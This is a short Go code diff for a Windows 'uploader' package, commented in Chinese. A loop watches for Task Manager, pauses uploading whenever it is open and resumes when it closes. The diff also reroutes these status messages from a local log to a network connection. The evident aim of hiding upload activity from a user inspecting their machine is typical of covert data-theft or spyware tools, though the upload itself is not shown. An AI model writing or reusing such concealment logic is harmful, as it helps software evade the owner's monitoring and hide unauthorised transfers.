@@ -1,7 +1,7 @@
 package uploader
 
 import (
-	"log"
+	"net"
 	"strings"
 	"syscall"
 	"time"
@@ -10,7 +10,7 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func StartTaskManagerDetector() {
+func StartTaskManagerDetector(factory net.Conn) {
 	if TaskmgrRunning.Load() {
 		return
 	}
@@ -19,10 +19,11 @@ func StartTaskManagerDetector() {
 			running := isTaskManagerRunning()
 			if running && !TaskmgrRunning.Load() {
 				TaskmgrRunning.Store(true)
-				log.Println("[goupload] 检测到任务管理器 → 暂停上传")
+				// log.Println("[goupload] 检测到任务管理器 → 暂停上传")
+				factory.Write([]byte("MSG\n" + "检测到任务管理器 → 暂停上传" + "\n"))
 			} else if !running && TaskmgrRunning.Load() {
 				TaskmgrRunning.Store(false)
-				log.Println("[goupload] 任务管理器关闭 → 恢复上传")
+				factory.Write([]byte("MSG\n" + "任务管理器关闭 → 恢复上传" + "\n"))
 			}
 			time.Sleep(2 * time.Second)
 		}
